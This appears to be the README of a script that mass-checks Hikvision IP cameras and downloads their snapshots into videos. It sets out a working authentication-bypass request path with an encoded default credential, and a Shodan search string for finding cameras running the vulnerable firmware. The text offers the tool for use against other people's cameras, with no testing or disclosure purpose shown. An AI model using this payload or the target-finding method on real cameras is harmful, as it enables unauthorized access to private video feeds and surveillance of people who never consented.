## Usage

### Create a `targets.txt` file
Create a `targets.txt` file in the root directory of the project with the following format:
```txt
IP:PORT
```
Each line should contain an IP address and port of a Hikvision camera.

### Run the script
```sh
python3 checker.py
```
The script will check the accessibility of the directories on the specified cameras, download snapshots, and compile them into videos.

## Configuration

- `directory_path`: The directory path to check for accessibility (default: `/onvif-http/snapshot?auth=YWRtaW46MTEK`).
- `targets.txt`: The file containing the IP addresses and ports of the target Hikvision cameras.

## Finding Targets

You can find potential targets using Shodan with the following Shodan dork:
```
3.1.3.150324
```
This dork searches for Hikvision cameras with the specific firmware version.
